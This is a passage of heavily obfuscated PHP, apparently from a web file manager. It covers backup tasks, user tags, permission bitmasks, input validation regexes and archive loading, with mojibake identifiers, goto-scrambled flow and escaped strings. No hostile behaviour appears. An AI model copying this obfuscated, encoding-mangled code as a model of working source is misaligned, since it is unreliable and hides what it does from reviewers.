parent::remove($A´ﬂÇ˘ëÁÛ); } public function add($D⁄ÙπŒ´àµ = array()) { goto c«í‹éèÁ§; c«í‹éèÁ§: $aÓåê€äú‹ =& $_SERVER[Æ¡î¢≠¯™]; if ($this->findByName($D⁄ÙπŒ´àµ[$aÓåê€äú‹[28]])) { return !1; } $bµúÍ»Æ” = array($aÓåê€äú‹[28] => $aÓåê€äú‹[33], $aÓåê€äú‹[381] => 1, $aÓåê€äú‹[2079] => $aÓåê€äú‹[2080], $aÓåê€äú‹[2081] => 1, $aÓåê€äú‹[1066] => 0, $aÓåê€äú‹[2082] => 0); goto dÀ‚ë®∑É∏; dÀ‚ë®∑É∏: $D⁄ÙπŒ´àµ = array_merge($bµúÍ»Æ”, $D⁄ÙπŒ´àµ); $D⁄ÙπŒ´àµ[$aÓåê€äú‹[2082]] = $this->getSort(); $this->filterAuth($D⁄ÙπŒ´àµ[$aÓåê€äú‹[381]]); goto fÇÉÑŸ•îå; fÇÉÑŸ•îå: return parent::insert($D⁄ÙπŒ´àµ); goto b‘Èëã≤Éπ; b‘Èëã≤Éπ: } private function getSort() { $cπ◊∑¨ìàÉ =& $_SERVER[Æ¡î¢≠¯™]; $d“≤øŒ®¿œ = parent::listData(); $a∞ê≥±øà‰ = array_to_keyvalue($d“≤øŒ®¿œ, $cπ◊∑¨ìàÉ[33], $cπ◊∑¨ìàÉ[2082]); return empty($a∞ê≥±øà‰) ? 0 : max($a∞ê≥±øà‰) + 1; } private function filterAuth(&$f¢ﬁ“«í—Á) { goto FóéüØ£»ﬂ; bêç’éÎâ¶: foreach ($E÷éïîÿêÕ as $FºﬂÑ–üıñ) { if (isset($Fàı÷◊Éã€[$FºﬂÑ–üıñ])) { $E÷éïîÿêÕ = array_merge($E÷éïîÿêÕ, $Fàı÷◊Éã€[$FºﬂÑ–üıñ]); } } $E÷éïîÿêÕ[] = self::AUTH_SHOW; $f¢ﬁ“«í—Á = array_sum(array_unique($E÷éïîÿêÕ)); goto fŸπ©£â…ç; FóéüØ£»ﬂ: if (!$f¢ﬁ“«í—Á) { return; } $cË»®±ìü™ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $E÷éïîÿêÕ = array(); goto Cˆ÷ª∞âûá; Cˆ÷ª∞âûá: foreach ($cË»®±ìü™ as $FºﬂÑ–üıñ) { if ($f¢ﬁ“«í—Á & $FºﬂÑ–üıñ) { $E÷éïîÿêÕ[] = $FºﬂÑ–üıñ; } } if (in_array(self::AUTH_ROOT, $E÷éïîÿêÕ)) { $f¢ﬁ“«í—Á = array_sum($cË»®±ìü™); return; } $Fàı÷◊Éã€ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto bêç’éÎâ¶; fŸπ©£â…ç: } public function sort($D©ñœ«®ˆ”, $a—úµÌå§Ü) { return parent::update($D©ñœ«®ˆ”, $a—úµÌå§Ü); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\56\142\141\x63\153\x75\x70\x4c\x69\163\164"; public $field = array("\x69\157", "\x6e\141\155\145", "\163\x74\141\x74\165\163", "\143\157\156\164\x65\x6e\164", "\162\x65\x73\x75\x6c\x74", "\164\151\x6d\145\x46\x72\157\155", "\164\151\x6d\x65\124\x6f"); public function config() { goto a≥ê¬⁄àú¢; c∞•≠êà¬Î: Action($FÿÊçãèû…[2083])->taskInit(); $EÜ”≤°ô¯¬ = Model($FÿÊçãèû…[2084])->listData(); foreach ($EÜ”≤°ô¯¬ as $cÙ≥¥Øëä≤) { if ($cÙ≥¥Øëä≤[$FÿÊçãèû…[1066]] == $FÿÊçãèû…[93] && $cÙ≥¥Øëä≤[$FÿÊçãèû…[1385]] == $FÿÊçãèû…[2085]) { $eå∞û”°á = $cÙ≥¥Øëä≤; break; } } goto Eºú∂èÃ∫Ñ; a≥ê¬⁄àú¢: $FÿÊçãèû… =& $_SERVER[Æ¡î¢≠¯™]; $a≠±±◊æ˘› = Model($FÿÊçãèû…[1074])->get($FÿÊçãèû…[704]); $a≠±±◊æ˘› = json_decode($a≠±±◊æ˘›, !0); goto føòÌåÇÓ∞; føòÌåÇÓ∞: $a≠±±◊æ˘› = is_array($a≠±±◊æ˘›) ? $a≠±±◊æ˘› : array(); if (!isset($a≠±±◊æ˘›[$FÿÊçãèû…[684]])) { $a≠±±◊æ˘›[$FÿÊçãèû…[684]] = $FÿÊçãèû…[472]; } $eå∞û”°á = array(); goto c∞•≠êà¬Î; Eºú∂èÃ∫Ñ: if (isset($eå∞û”°á[$FÿÊçãèû…[197]])) { $eå∞û”°á[$FÿÊçãèû…[197]] = json_decode($eå∞û”°á[$FÿÊçãèû…[197]], !0); } if (isset($a≠±±◊æ˘›[$FÿÊçãèû…[197]])) { $eå∞û”°á[$FÿÊçãèû…[197]][$FÿÊçãèû…[1372]] = $a≠±±◊æ˘›[$FÿÊçãèû…[197]]; unset($a≠±±◊æ˘›[$FÿÊçãèû…[197]]); } return array_merge($eå∞û”°á, $a≠±±◊æ˘›); goto AçÑçÓìÒ¥; AçÑçÓìÒ¥: } public function listData($EÛ†”–É≈’ = false, $B¢»•ÈÍµå = "\x6d\157\x64\151\x66\171\124\151\155\x65", $F∑÷Àé◊∂œ = false) { return parent::listData($EÛ†”–É≈’, $B¢»•ÈÍµå, !0); } public function lastItem() { $eßõ±âö¥ú = $this->listData(); return !empty($eßõ±âö¥ú[0]) ? $eßõ±âö¥ú[0] : null; } public function kill($Dâ®™Ëøã•) { goto EëœƒèÚåñ; cäåíø ≈: $Bÿú≈Ç‹ó“ = $a∫«•üπ‹∞[$d˜àÿíˆ‡ﬁ[28]]; $B·ã«…≤íñ = TEMP_FILES . $d˜àÿíˆ‡ﬁ[702] . $Bÿú≈Ç‹ó“ . $d˜àÿíˆ‡ﬁ[8]; IO::remove($B·ã«…≤íñ, !1); goto BËÚ£„¨±∂; EëœƒèÚåñ: $d˜àÿíˆ‡ﬁ =& $_SERVER[Æ¡î¢≠¯™]; $a∫«•üπ‹∞ = $this->listData($Dâ®™Ëøã•); if (!$a∫«•üπ‹∞ || empty($a∫«•üπ‹∞[$d˜àÿíˆ‡ﬁ[28]])) { return !0; } goto C∫º¥ÏØä≥; C∫º¥ÏØä≥: Task::kill($d˜àÿíˆ‡ﬁ[703]); Task::kill($d˜àÿíˆ‡ﬁ[721]); Task::kill($d˜àÿíˆ‡ﬁ[728]); goto cäåíø ≈; BËÚ£„¨±∂: return $this->remove($Dâ®™Ëøã•); goto a†‚Î≤°ØÁ; a†‚Î≤°ØÁ: } public function remove($CÎìﬂ…ÔõÉ) { $E©ƒ‹ÊÖ∆• = $this->listData($CÎìﬂ…ÔõÉ); if (!$E©ƒ‹ÊÖ∆•) { return !0; } return $this->backupRemove($E©ƒ‹ÊÖ∆•); } private function backupRemove($D∂É¨∏™˘±) { $b√Ñî≤Ãíﬁ =& $_SERVER[Æ¡î¢≠¯™]; parent::remove($D∂É¨∏™˘±[$b√Ñî≤Ãíﬁ[372]]); $b¢íπ¥åÿÒ = "\x7b\x69\x6f\x3a{$D∂É¨∏™˘±[$b√Ñî≤Ãíﬁ[683]]}\175\57\x64\141\x74\141\142\x61\163\x65\57\x62\x61\143\x6b\x75\x70\x5f" . $D∂É¨∏™˘±[$b√Ñî≤Ãíﬁ[28]]; IO::remove($b¢íπ¥åÿÒ, !1); return !0; } public function start() { goto B¥ààµúìÙ; B•∫â¶ã∞›: return !0; goto dÇÕöÿ¡Ïó; eÂ∑µÖ§Ãº: if (!$F∂°©≈ÌëÈ || $F∂°©≈ÌëÈ[$Aÿ™ÀﬂÑ®ã[1369]] != $Aÿ™ÀﬂÑ®ã[93]) { return !1; } $BÉœî≈±¨π = $this->process(); foreach ($BÉœî≈±¨π as $AëÀÓ¯√áë) { if ($AëÀÓ¯√áë) { return Task::restart($AëÀÓ¯√áë[$Aÿ™ÀﬂÑ®ã[372]]); } } goto a¥í⁄Ω‹≤”; fÕﬂªúÇ€¥: if (!$F´≈Ã‡Á≤‡->dbFile()) { return !1; } if ($F∂°©≈ÌëÈ[$Aÿ™ÀﬂÑ®ã[684]] == $Aÿ™ÀﬂÑ®ã[472]) { $F´≈Ã‡Á≤‡->file(); } Backup::set(array($Aÿ™ÀﬂÑ®ã[681] => 1, $Aÿ™ÀﬂÑ®ã[695] => time())); goto B•∫â¶ã∞›; B¥ààµúìÙ: $Aÿ™ÀﬂÑ®ã =& $_SERVER[Æ¡î¢≠¯™]; if ($GLOBALS[$Aÿ™ÀﬂÑ®ã[6]][$Aÿ™ÀﬂÑ®ã[94]][$Aÿ™ÀﬂÑ®ã[2086]] != $Aÿ™ÀﬂÑ®ã[93]) { return !0; } $F∂°©≈ÌëÈ = $this->config(); goto eÂ∑µÖ§Ãº; a¥í⁄Ω‹≤”: $F´≈Ã‡Á≤‡ = new Backup(); $F´≈Ã‡Á≤‡->keep(); if (!$F´≈Ã‡Á≤‡->db()) { return !1; } goto fÕﬂªúÇ€¥; dÇÕöÿ¡Ïó: } public function process() { $d⁄∂ÿ‹ûïì =& $_SERVER[Æ¡î¢≠¯™]; return array($d⁄∂ÿ‹ûïì[686] => Task::get($d⁄∂ÿ‹ûïì[703]), $d⁄∂ÿ‹ûïì[689] => Task::get($d⁄∂ÿ‹ûïì[721]), $d⁄∂ÿ‹ûïì[174] => Task::get($d⁄∂ÿ‹ûïì[728])); } public function restore() { $AÖ≠ÃÀ…≥» =& $_SERVER[Æ¡î¢≠¯™]; ActionCall($AÖ≠ÃÀ…≥»[2087], !0, 1); ActionCall($AÖ≠ÃÀ…≥»[2087], !0, 0); } } goto E‰ÔÃô™±À; Eâ◊üõãâ˜: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\x65\162\137\157\160\x74\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($DÖëÑ⁄ò£“) { $dÑ‹Œﬂ£¬ô =& $_SERVER[Æ¡î¢≠¯™]; if (!defined($dÑ‹Œﬂ£¬ô[431])) { define($dÑ‹Œﬂ£¬ô[431], 0); } return "\125\163\145\x72\117\160\x74\151\x6f\x6e\137{$DÖëÑ⁄ò£“}\x5f" . USER_ID; } protected function filterWhere($Dõ“ÙÔªâù) { $CÒüÖ∫ú◊÷ =& $_SERVER[Æ¡î¢≠¯™]; if (!defined($CÒüÖ∫ú◊÷[431])) { define($CÒüÖ∫ú◊÷[431], 0); } $Dõ“ÙÔªâù[$CÒüÖ∫ú◊÷[1397]] = USER_ID; return $Dõ“ÙÔªâù; } public function cacheRemoveUser($dÜ‹ò¶Í»è, $e’¡∂›§ºï) { return Cache::remove("\125\163\145\x72\x4f\160\164\151\x6f\x6e\x5f{$dÜ‹ò¶Í»è}\137" . $e’¡∂›§ºï); } protected function optionDefault($eæ◊ÃÌ∆∏¢ = '') { $f≥Û çäÜÌ =& $_SERVER[Æ¡î¢≠¯™]; if ($eæ◊ÃÌ∆∏¢ == $f≥Û çäÜÌ[33]) { return $GLOBALS[$f≥Û çäÜÌ[6]][$f≥Û çäÜÌ[2486]]; } if ($eæ◊ÃÌ∆∏¢ == $f≥Û çäÜÌ[2487]) { return $GLOBALS[$f≥Û çäÜÌ[6]][$f≥Û çäÜÌ[2488]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\x65\162\x2e\164\141\x67\114\x69\163\x74"; public $modelType = "\x55\x73\x65\x72\x4f\160\164\151\x6f\156"; public $field = array("\x6e\141\x6d\x65", "\x73\164\x79\x6c\x65", "\163\157\162\164"); public function listData($cÈò ∏ıÉÏ = false, $bÚ∫∆ïÖñ´ = "\163\x6f\x72\x74", $F⁄À≠ò•ÍÓ = false) { return parent::listData($cÈò ∏ıÉÏ, $bÚ∫∆ïÖñ´, $F⁄À≠ò•ÍÓ); } public function remove($e‡‚ã¥ı ˜) { return parent::remove($e‡‚ã¥ı ˜); } public function add($eúáÉåÕåˆ, $c∞ü∏ÚÓ‰∫ = "\x6c\x61\142\145\154\x2d\x67\x72\x65\x79\x2d\156\x6f\162\x6d\x61\x6c") { $b’⁄√«Ê£ä =& $_SERVER[Æ¡î¢≠¯™]; if ($this->findByName($eúáÉåÕåˆ)) { return !1; } $cÿ„ŸÇ‹§Ê = array($b’⁄√«Ê£ä[391] => $eúáÉåÕåˆ, $b’⁄√«Ê£ä[441] => $c∞ü∏ÚÓ‰∫, $b’⁄√«Ê£ä[2065] => $this->getSort($b’⁄√«Ê£ä[252]) + 1); return parent::insert($cÿ„ŸÇ‹§Ê); } public function update($aûÇŒÓçî´, $cã∆‚ü®Ñƒ) { $AπÆ¬Ò££ª =& $_SERVER[Æ¡î¢≠¯™]; $DŒ⁄•◊È£ö = $this->listData($aûÇŒÓçî´); $aåß§’Ú¬‚ = $this->findByName($cã∆‚ü®Ñƒ[$AπÆ¬Ò££ª[28]]); if (!$DŒ⁄•◊È£ö || $aåß§’Ú¬‚ && $aåß§’Ú¬‚[$AπÆ¬Ò££ª[372]] != $DŒ⁄•◊È£ö[$AπÆ¬Ò££ª[372]]) { return !1; } return parent::update($aûÇŒÓçî´, $cã∆‚ü®Ñƒ); } public function moveTop($Aº»Â„Ì≤ﬂ) { $Eâƒßﬂã·‰ =& $_SERVER[Æ¡î¢≠¯™]; $f¢‡ﬂÊ∂∞ç = parent::listData(); $F”ÙÎπ“ª¿ = $this->getSort($Eâƒßﬂã·‰[251]); foreach ($f¢‡ﬂÊ∂∞ç as &$AßÖ≥íõÓç) { if ($AßÖ≥íõÓç[$Eâƒßﬂã·‰[372]] == $Aº»Â„Ì≤ﬂ) { $AßÖ≥íõÓç[$Eâƒßﬂã·‰[2082]] = $F”ÙÎπ“ª¿; continue; } $AßÖ≥íõÓç[$Eâƒßﬂã·‰[2082]] += 1; } return parent::resetData($f¢‡ﬂÊ∂∞ç); } public function moveBottom($F»âáﬂÚéº) { $AÓª›çÛËÍ =& $_SERVER[Æ¡î¢≠¯™]; $Eª≈êáÌñò = $this->getSort($AÓª›çÛËÍ[252]) + 1; return parent::update($F»âáﬂÚéº, array($AÓª›çÛËÍ[2082] => $Eª≈êáÌñò)); } public function resetSort($B—˘ÛÎÚéî) { goto bÙ„ã≥üÌ≠; bæ‹¬∫∑®…: return parent::resetData($Bïæ⁄¥ÿﬁ•); goto dÌâÆü”Œµ; bÙ„ã≥üÌ≠: $AñËó≠Õé∂ =& $_SERVER[Æ¡î¢≠¯™]; $eê⁄ÊôË‰Ó = array(); $B—˘ÛÎÚéî = is_array($B—˘ÛÎÚéî) ? $B—˘ÛÎÚéî : array(); goto fÃ≥±àáœÊ; fÃ≥±àáœÊ: for ($FáÂŸƒÚ–Ã = 0; $FáÂŸƒÚ–Ã < count($B—˘ÛÎÚéî); $FáÂŸƒÚ–Ã++) { $eê⁄ÊôË‰Ó[$B—˘ÛÎÚéî[$FáÂŸƒÚ–Ã] . $AñËó≠Õé∂[33]] = $FáÂŸƒÚ–Ã + 1; } $Bïæ⁄¥ÿﬁ• = parent::listData(); foreach ($Bïæ⁄¥ÿﬁ• as &$f£ƒÔæ‘⁄ö) { $BÜ‹Õ„è∆† = $eê⁄ÊôË‰Ó[$f£ƒÔæ‘⁄ö[$AñËó≠Õé∂[372]]]; $f£ƒÔæ‘⁄ö[$AñËó≠Õé∂[2082]] = $BÜ‹Õ„è∆† ? $BÜ‹Õ„è∆† : $f£ƒÔæ‘⁄ö[$AñËó≠Õé∂[2082]]; } goto bæ‹¬∫∑®…; dÌâÆü”Œµ: } private function getSort($BÀù√Úƒ”˘) { $E≠î“º´Ÿê =& $_SERVER[Æ¡î¢≠¯™]; $C…Ìïüã∑Ç = parent::listData(); $FÑ£ìÑ•Ù = array_to_keyvalue($C…Ìïüã∑Ç, $E≠î“º´Ÿê[33], $E≠î“º´Ÿê[2082]); if (!$FÑ£ìÑ•Ù) { $FÑ£ìÑ•Ù = array(0); } $fŸ∂Æ∑ı§∑ = $BÀù√Úƒ”˘ == $E≠î“º´Ÿê[252] ? max($FÑ£ìÑ•Ù) : min($FÑ£ìÑ•Ù); return intval($fŸ∂Æ∑ı§∑); } } goto EƒÂ≈∑ÕâŸ; Eêû©…‰¢ª: class Input { public static function getArray($Aé®‡Ò˘®¯) { goto bØ´ ã∫èë; F¡Œ£”Í“è: $b§ÜÜ ºÙì = array(); $EçË∏›≥ü≠ = LNG($fÒŒ¶†Ïè¿[1833]); foreach ($Aé®‡Ò˘®¯ as $eŸáΩ„∂√… => $eå¶ßîõÍµ) { goto Cµ–¨§î”©; fæöØæÑ«Ö: if (!array_key_exists($eŸáΩ„∂√…, $in)) { if (array_key_exists($fÒŒ¶†Ïè¿[1835], $eå¶ßîõÍµ)) { if (!is_null($eå¶ßîõÍµ[$fÒŒ¶†Ïè¿[1835]])) { $Eæ¶ù∑•Ÿ•[$cÃ´•†·ßµ] = $eå¶ßîõÍµ[$fÒŒ¶†Ïè¿[1835]]; } } else { if (isset($eå¶ßîõÍµ[$fÒŒ¶†Ïè¿[1836]])) { $b§ÜÜ ºÙì[] = $E“ºãåÁËâ; } } continue; } if (isset($eå¶ßîõÍµ[$fÒŒ¶†Ïè¿[1836]]) && $eå¶ßîõÍµ[$fÒŒ¶†Ïè¿[1836]] == $fÒŒ¶†Ïè¿[288]) { $C‘ëß•ÍÇ≥ = json_decode($in[$eŸáΩ„∂√…], !0); if (is_array($C‘ëß•ÍÇ≥)) { $Eæ¶ù∑•Ÿ•[$cÃ´•†·ßµ] = $C‘ëß•ÍÇ≥; } else { if (array_key_exists($fÒŒ¶†Ïè¿[1835], $eå¶ßîõÍµ)) { if (!is_null($eå¶ßîõÍµ[$fÒŒ¶†Ïè¿[1835]])) { $Eæ¶ù∑•Ÿ•[$cÃ´•†·ßµ] = $eå¶ßîõÍµ[$fÒŒ¶†Ïè¿[1835]]; } } else { $b§ÜÜ ºÙì[] = $E“ºãåÁËâ; } } continue; } $B§µà¡º“§ = _get($eå¶ßîõÍµ, $fÒŒ¶†Ïè¿[997]); goto C‚ıß¶ìÜÜ; Cµ–¨§î”©: $E“ºãåÁËâ = _get($eå¶ßîõÍµ, $fÒŒ¶†Ïè¿[1224], $EçË∏›≥ü≠ . $fÒŒ¶†Ïè¿[868] . $eŸáΩ„∂√…); $cÃ´•†·ßµ = $eŸáΩ„∂√…; if (isset($eå¶ßîõÍµ[$fÒŒ¶†Ïè¿[1834]]) && $eå¶ßîõÍµ[$fÒŒ¶†Ïè¿[1834]]) { $cÃ´•†·ßµ = $eå¶ßîõÍµ[$fÒŒ¶†Ïè¿[1834]]; } goto fæöØæÑ«Ö; C‚ıß¶ìÜÜ: if (isset($eå¶ßîõÍµ[$fÒŒ¶†Ïè¿[1836]]) && !self::check($in[$eŸáΩ„∂√…], $eå¶ßîõÍµ[$fÒŒ¶†Ïè¿[1836]], $B§µà¡º“§)) { if (array_key_exists($fÒŒ¶†Ïè¿[1835], $eå¶ßîõÍµ)) { if (!is_null($eå¶ßîõÍµ[$fÒŒ¶†Ïè¿[1835]])) { $Eæ¶ù∑•Ÿ•[$cÃ´•†·ßµ] = $eå¶ßîõÍµ[$fÒŒ¶†Ïè¿[1835]]; } } else { $b§ÜÜ ºÙì[] = $E“ºãåÁËâ; } continue; } $Eæ¶ù∑•Ÿ•[$cÃ´•†·ßµ] = $in[$eŸáΩ„∂√…]; goto fÍÖÍêÉÌÁ; fÍÖÍêÉÌÁ: } goto Eƒé“¨Î¡®; bØ´ ã∫èë: $fÒŒ¶†Ïè¿ =& $_SERVER[Æ¡î¢≠¯™]; global $in; $Eæ¶ù∑•Ÿ• = array(); goto F¡Œ£”Í“è; Eƒé“¨Î¡®: if (count($b§ÜÜ ºÙì) > 0) { show_json(implode($fÒŒ¶†Ïè¿[1837], $b§ÜÜ ºÙì), !1); } return $Eæ¶ù∑•Ÿ•; goto Cú‰—Èƒ∆Ô; Cú‰—Èƒ∆Ô: } public static function reg($cê¯é®¡¥∏ = "\x72\x65\161\165\x69\162\x65") { static $B¥Ï∆≥…¯ = array("\x72\145\161\x75\x69\x72\145" => "\56\53", "\156\165\155\142\x65\x72" => "\x5c\144\x2b", "\150\145\x78" => "\x5b\60\x2d\x39\101\55\106\x61\55\146\135\53", "\x69\x6e\x74" => "\133\x2d\x5c\x2b\135\77\134\144\x2b", "\x62\157\x6f\154" => "\60\174\61", "\x66\154\x6f\x61\164" => "\x5b\55\134\x2b\135\77\134\x64\53\50\134\x2e\134\144\x2b\51\x3f", "\x65\156\x67\x6c\x69\163\150" => "\133\101\55\x5a\x61\55\172\40\x5d\53", "\143\x68\x69\156\x65\x73\145" => "\133\134\170\173\64\x65\60\60\175\x2d\x5c\x78\x7b\x39\146\x61\65\175\135\53", "\150\x61\x73\103\x68\x69\156\145\163\x65" => "\57\50\x5b\134\170\173\64\x65\x30\x30\175\x2d\x5c\x78\x7b\71\146\141\65\x7d\x5d\x2b\51\57\x75", "\x65\155\141\x69\x6c" => "\134\167\53\x28\x5b\134\56\x5c\x2d\135\134\167\x2b\51\52\134\100\x5c\167\x2b\x28\x5b\134\56\x5c\x2d\x5d\x5c\x77\x2b\x29\x2a\134\56\x5c\x77\53", "\160\x68\x6f\156\145" => "\x31\133\63\x2d\71\135\x5c\144\x7b\71\x7d", "\164\145\154\x70\150\x6f\156\x65" => "\50\134\x28\134\x64\173\63\54\64\175\134\x29\x7c\134\144\173\x33\x2c\x34\175\x2d\174\x5c\163\x29\x3f\134\144\x7b\67\54\61\64\175", "\165\x72\154" => "\x28\x68\x74\164\160\174\x66\x74\160\x7c\x68\x74\164\160\163\x29\72\134\x2f\134\57\133\134\167\x5c\55\x5f\x5d\x2b\50\134\x2e\133\134\167\x5c\x2d\137\x5d\x2b\x29\53\50\133\134\167\134\x2d\x5c\x2e\x2c\x40\x3f\136\75\45\46\x3a\134\57\176\x5c\x2b\x23\135\x2a\x5b\134\x77\x5c\55\x5c\100\77\136\x3d\45\x26\x5c\57\x7e\x5c\53\43\x5d\51\77", "\x75\162\154\106\165\x6c\x6c" => "\133\141\55\x7a\x41\55\172\135\x2b\72\134\57\134\57\x5b\x5e\134\163\x5d\52", "\151\160" => "\50\x5c\144\x7b\x31\54\x33\175\x5c\x2e\x29\173\x33\x7d\x28\134\x64\173\61\x2c\63\x7d\51", "\172\x69\x70" => "\133\61\x2d\71\x5d\134\144\x7b\x35\x7d\x28\77\x21\134\x64\51", "\151\x64\103\x61\162\144" => "\x28\x5c\x64\173\61\65\175\51\x7c\x28\x5c\x64\173\x31\x37\175\x28\134\144\x7c\x58\x7c\x78\51\51", "\x63\x6f\154\157\162" => "\43\x28\133\x30\x2d\x39\101\55\106\141\x2d\x66\135\x7b\63\x7d\174\x5b\x30\55\x39\x41\55\106\141\x2d\146\x5d\173\66\175\51", "\x74\x69\155\x65" => "\x28\x5b\x30\55\x31\135\134\x64\x7c\x32\x5b\60\x2d\64\x5d\51\72\133\60\55\x35\x5d\x5c\144", "\144\141\x74\x65" => "\134\x64\173\x34\175\x5b\55\134\x2f\135\x3f\x28\x30\x5b\61\x2d\x39\135\x7c\61\133\60\55\62\x5d\51\x5b\55\134\57\x5d\77\50\133\60\55\62\135\x5c\144\174\x33\133\60\55\x31\x5d\x29", "\144\x61\164\x65\x54\x69\155\x65" => "\x5c\144\173\64\175\133\x2d\x5c\57\x5d\77\x28\x30\133\61\x2d\71\x5d\174\x31\133\x30\55\x32\x5d\51\133\x2d\134\x2f\135\77\x28\133\60\55\x32\x5d\x5c\144\174\63\133\60\55\x31\135\x29\134\163\x2b\x28\133\x30\x2d\x31\x5d\x5c\144\x7c\x32\x5b\60\x2d\64\135\51\72\x5b\60\x2d\x35\x5d\134\144", "\x70\141\163\163\167\x6f\x72\x64" => "\x28\x3f\x3d\x2e\x2a\134\x64\51\x28\x3f\x3d\56\52\133\x61\55\x7a\135\51\x28\x3f\x3d\56\x2a\133\101\55\132\135\x29\56\173\x38\x2c\62\x30\175", "\153\145\x79" => "\133\x41\55\132\141\55\172\x30\x2d\71\137\134\x2d\134\x2e\135\53", "\153\x65\x79\x46\x75\x6c\x6c" => "\x5b\x41\x2d\132\141\55\172\x30\x2d\71\137\134\55\134\56\134\x73\54\135\53"); if (!$cê¯é®¡¥∏) { return $B¥Ï∆≥…¯; } return $B¥Ï∆≥…¯[$cê¯é®¡¥∏]; } public static function check($Eöä¿’ïã¿, $dãÑ·ÉØı©, $fÛ€∑®ËŸç = null) { $F¥…ÍòÑπ¥ =& $_SERVER[Æ¡î¢≠¯™]; switch ($dãÑ·ÉØı©) { case $F¥…ÍòÑπ¥[7]: return in_array($Eöä¿’ïã¿, $fÛ€∑®ËŸç); break; case $F¥…ÍòÑπ¥[1838]: return floatval($Eöä¿’ïã¿) > $fÛ€∑®ËŸç; break; case $F¥…ÍòÑπ¥[1839]: return floatval($Eöä¿’ïã¿) < $fÛ€∑®ËŸç; break; case $F¥…ÍòÑπ¥[331]: return strlen($Eöä¿’ïã¿) >= $fÛ€∑®ËŸç[0] && strlen($Eöä¿’ïã¿) <= $fÛ€∑®ËŸç[1]; break; case $F¥…ÍòÑπ¥[331]: if (is_array($fÛ€∑®ËŸç)) { return strlen($Eöä¿’ïã¿) >= $fÛ€∑®ËŸç[0] && strlen($Eöä¿’ïã¿) <= $fÛ€∑®ËŸç[1]; break; } else { return strlen($Eöä¿’ïã¿) == $fÛ€∑®ËŸç; break; } case $F¥…ÍòÑπ¥[327]: return floatval($Eöä¿’ïã¿) >= $fÛ€∑®ËŸç[0] && floatval($Eöä¿’ïã¿) <= $fÛ€∑®ËŸç[1]; break; } $A◊û¡â¢¨¥ = self::reg(!1); $dãÑ·ÉØı© = isset($A◊û¡â¢¨¥[$dãÑ·ÉØı©]) ? $A◊û¡â¢¨¥[$dãÑ·ÉØı©] : $dãÑ·ÉØı©; if (substr($dãÑ·ÉØı©, 0, 1) != $F¥…ÍòÑπ¥[8]) { $dãÑ·ÉØı© = $F¥…ÍòÑπ¥[1840] . $dãÑ·ÉØı© . $F¥…ÍòÑπ¥[1841]; } return preg_match($dãÑ·ÉØı©, $Eöä¿’ïã¿) === 1; } public static function get($D¡´‹¥Ù ∞, $d¶íÈÀæ°– = null, $Fãê©≠≈Ç¶ = null, $Cô∆«ã”àà = null) { goto B·≠ıéûˆ±; Aäé«Œ‘ˆﬁ: if (!is_null($Cô∆«ã”àà)) { $fìÓŒ∑Ω⁄ä[$dﬁÿﬁÊ†÷ã[997]] = $Cô∆«ã”àà; } if (!is_null($d¶íÈÀæ°–)) { $fìÓŒ∑Ω⁄ä[$dﬁÿﬁÊ†÷ã[1836]] = $d¶íÈÀæ°–; } $d®œ•ÙüÔ¯ = Input::getArray(array($D¡´‹¥Ù ∞ => $fìÓŒ∑Ω⁄ä)); goto BÙú©≤∞≠¡; B·≠ıéûˆ±: $dﬁÿﬁÊ†÷ã =& $_SERVER[Æ¡î¢≠¯™]; $fìÓŒ∑Ω⁄ä = array(); if (!is_null($Fãê©≠≈Ç¶)) { $fìÓŒ∑Ω⁄ä[$dﬁÿﬁÊ†÷ã[34]] = $Fãê©≠≈Ç¶; } goto Aäé«Œ‘ˆﬁ; BÙú©≤∞≠¡: return $d®œ•ÙüÔ¯[$D¡´‹¥Ù ∞]; goto bçﬂ‚¡—îÊ; bçﬂ‚¡—îÊ: } } class KodArchive { static function init() { goto AÌ…Õ¢‚ †; A„á©π©ú©: define($eûÔ∞áÁÖ»[1844], TEMP_FILES); define($eûÔ∞áÁÖ»[1845], TEMP_FILES); define($eûÔ∞áÁÖ»[1846], $eûÔ∞áÁÖ»[1847]); goto FÇü¡Â‚£í; FÇü¡Â‚£í: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $eûÔ∞áÁÖ»[1848]; require_once ARCHIVE_LIB . $eûÔ∞áÁÖ»[1849]; goto AìÒöΩΩ§é; AìÒöΩΩ§é: require_once ARCHIVE_LIB . $eûÔ∞áÁÖ»[1850]; require_once ARCHIVE_LIB . $eûÔ∞áÁÖ»[1851]; require_once ARCHIVE_LIB . $eûÔ∞áÁÖ»[1852]; goto D∆˜…≈Û∑¶; AÌ…Õ¢‚ †: $eûÔ∞áÁÖ» =& $_SERVER[Æ¡î¢≠¯™]; if (defined($eûÔ∞áÁÖ»[1842])) { return; } define($eûÔ∞áÁÖ»[1842], SDK_DIR . $eûÔ∞áÁÖ»[1843]); goto A„á©π©ú©; D∆˜…≈Û∑¶: require_once ARCHIVE_LIB . $eûÔ∞áÁÖ»[1853]; goto CÃÔÛ‹îÁˆ; CÃÔÛ‹îÁˆ: } static function checkIfType($bî∂†Õè°Ó, $f˘∆Ñ∂…Ïö) { goto A≠ÉÆ•äè; aŸﬁáÍí®Ÿ: return $E≠»´ÎÃ∫ô; goto c≈ÂîÃ∆™¨; A≠ÉÆ•äè: $Fà‡ŸÂÈèà =& $_SERVER[Æ¡î¢≠¯™]; self::init(); $A˘ë§Í¡Ï¨ = array($Fà‡ŸÂÈèà[307] => array($Fà‡ŸÂÈèà[307], $Fà‡ŸÂÈèà[1854], $Fà‡ŸÂÈèà[1855], $Fà‡ŸÂÈèà[1856]), $Fà‡ŸÂÈèà[1857] => array($Fà‡ŸÂÈèà[1857], $Fà‡ŸÂÈèà[1858], $Fà‡ŸÂÈèà[1029], $Fà‡ŸÂÈèà[1027]), $Fà‡ŸÂÈèà[1031] => 